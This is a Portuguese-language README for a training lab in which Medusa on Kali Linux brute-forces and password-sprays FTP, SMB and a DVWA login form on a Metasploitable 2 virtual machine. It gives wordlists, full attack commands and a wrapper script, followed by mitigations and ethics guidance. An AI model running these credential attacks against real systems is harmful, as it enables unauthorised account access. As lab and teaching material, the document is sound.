# Laboratório: Medusa (Kali) vs Metasploitable — README

---

## 1. Resumo do projeto
Este projeto demonstra testes de força bruta e password spraying utilizando a ferramenta **Medusa** em um ambiente de laboratório composto por **Kali Linux** (atacante) e **Metasploitable 2** (alvo). O objetivo é praticar técnicas de enumeração e ataques controlados, documentar procedimentos, resultados e propor medidas de mitigação.

---

## 2. Escopo
- Serviços testados: **FTP**, **SMB** (Samba) e **formulário web (DVWA)**.
- Ferramenta principal: **Medusa** (Kali Linux).
- Wordlists educacionais e pequenas (para fins didáticos).
- Documentação de comandos, evidências e recomendações de segurança.

---

## 3. Requisitos
- VirtualBox (ou outro hypervisor com redes host-only / internal).
- ISO/VMs: Kali Linux (atacante) e Metasploitable 2 (alvo).
- Medusa instalado no Kali: `sudo apt update && sudo apt install medusa -y`.
- Ferramentas auxiliares (opcional): Burp Suite, OWASP ZAP, wireshark, tcpdump, fail2ban.

---

## 4. Arquitetura e IPs sugeridos

- Kali (atacante): `192.168.56.10`
- Metasploitable (alvo): `192.168.56.20`

---

## 5. Preparação das VMs (passo-a-passo)
1. Importar/instalar as VMs no VirtualBox.
2. Configurar adaptadores de rede conforme seção anterior.
3. Definir IPs estáticos na interface host-only ou usar o DHCP do VirtualBox.
4. No Kali, instalar/atualizar pacotes:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install medusa tcpdump wireshark -y
```

5. Garantir que Metasploitable esteja acessível:

```bash
ping 192.168.56.20
```

---

## 6. Wordlists

`users.txt`
```
root
admin
ftp
msfadmin
tom
```

`pass_short.txt`
```
123456
password
admin
qwerty
msfadmin
```

`pass_common.txt`
```
Summer2024
Senha@123
P@ssw0rd
1234abcd
```

---

## 7. Comandos Medusa — exemplos e explicações
**FTP — força bruta com lista de usuários e senhas**

```bash
medusa -h 192.168.56.20 -U /home/kali/lists/users.txt -P /home/kali/lists/pass_short.txt -M ftp -t 4 > /home/kali/results/medusa_ftp.txt
```
- `-h` host alvo
- `-U` arquivo com usuários (um por linha)
- `-P` arquivo com senhas
- `-M ftp` módulo/serviço
- `-t` threads (paralelismo)
- saída redirecionada para arquivo de resultados

**SMB — password spraying (poucas senhas contra vários usuários)**

```bash
medusa -h 192.168.56.20 -U /home/kali/lists/users.txt -P /home/kali/lists/pass_common.txt -M smb -t 6 > /home/kali/results/medusa_smb.txt
```

**HTTP form (DVWA) — conceito e exemplo**

Medusa suporta módulo `http_form`, mas configurar o parâmetro `-m` pode ser sensível ao formulário. Modelo genérico:

```bash
medusa -h 192.168.56.20 -U /home/kali/lists/users.txt -P /home/kali/lists/pass_short.txt -M http_form -m FORM:'/dvwa/login.php:username:password:Login failed' -t 4 > /home/kali/results/medusa_dvwa.txt
```

- `FORM:` formato: `'<path>:<campo_user>:<campo_pass>:<texto_indicador_falha>'`
- Ajuste `path` para o endpoint correto e `texto_indicador_falha` para a mensagem exibida quando o login falha (usada para identificar sucesso quando ausente).

---

## 8. Coleta de evidências e validação
1. Salvar saídas do Medusa (como nos comandos acima).
2. Tirar screenshots do terminal mostrando credenciais encontradas.
3. Validar acesso manualmente (apenas no laboratório):
   - FTP: `ftp 192.168.56.20` e realizar `ls` após login.
   - SMB: `smbclient -L \\192.168.56.20 -U username%password`.
4. Coletar logs do alvo (Metasploitable): `/var/log/auth.log`, `/var/log/syslog`.
5. Anotar número de tentativas e duração do teste.

---

## 9. Exemplos de resultados (modelo a preencher)
- **Comando:** `medusa -h 192.168.56.20 -U users.txt -P pass_short.txt -M ftp -t 4`
- **Resultado encontrado:** `ftp:msfadmin:msfadmin`
- **Evidência:** `screenshots/ftp_login_success.png` (colocar capture)
- **Logs:** trecho de `/var/log/auth.log` com a autenticação bem sucedida.


---

## 10. Análise de risco (hipotética)
Se as credenciais fracas identificadas existissem em um sistema de produção, o atacante poderia:
- Acessar dados sensíveis via FTP/SMB
- Movimentar-se lateralmente na rede
- Implantar backdoors/serviços maliciosos
- Exfiltrar informações

Impacto depende do serviço comprometido e do papel do usuário comprometido.

---

## 11. Recomendações de mitigação
1. **Senhas fortes e políticas de expiração** — mínimo 12+ caracteres, evitar senhas comuns.
2. **Bloqueio e atrasos por tentativas** — lockout temporário ou incremento de delay após X falhas.
3. **MFA** — aplicar sempre que possível.
4. **Rate limiting / WAF** — limitar requisições por IP aos endpoints de login.
5. **Monitoramento/alerting** — detectar bursts de tentativas de autenticação e IPs suspeitos.
6. **Fail2ban / bloqueio automático** — automatizar bloqueios temporários.
7. **Desabilitar serviços desnecessários** — por exemplo, FTP em produção; usar SFTP/FTPS se necessário.
8. **Harden SMB** — desativar SMBv1, políticas de senha, logs centralizados.
9. **Segmentação de rede** — isolar serviços críticos.

---

## 12. Boas práticas e ética
- Execute testes apenas em ambientes controlados e autorizados.
- Documente data/hora e escopo dos testes.
- Não publique credenciais reais ou endereços de sistemas de terceiros.
- Ao divulgar resultados, deixe claro que se trata de laboratório.

---

## 13. Próximos passos / extensões sugeridas
- Integrar `hydra`, `Burp` e `OWASP ZAP` para comparação de técnicas.
- Criar wordlists customizadas (regras de combinação, mutações de senhas) e medir eficiência.
- Automatizar geração de relatórios (scripts que compilam logs, screenshots e outputs).
- Testar detecções com `fail2ban` configurado e avaliar falso-positivos.

---

## 14. Apêndice — Scripts e templates
**Template simples (bash) para executar Medusa e salvar saída**

```bash
#!/bin/bash
TARGET=192.168.56.20
USERLIST=/home/kali/lists/users.txt
PASSLIST=/home/kali/lists/pass_short.txt
OUTDIR=/home/kali/results
mkdir -p "$OUTDIR"
medusa -h "$TARGET" -U "$USERLIST" -P "$PASSLIST" -M ftp -t 4 > "$OUTDIR/medusa_$(date +%Y%m%d_%H%M%S)_ftp.txt"
```


---

## 15. Referências
- Documentação Medusa: `man medusa` e `medusa --help`
- DVWA: https://github.com/digininja/DVWA
- Metasploitable 2: https://sourceforge.net/projects/metasploitable/
- OWASP — recursos sobre proteção de autenticação

---

**FIM**


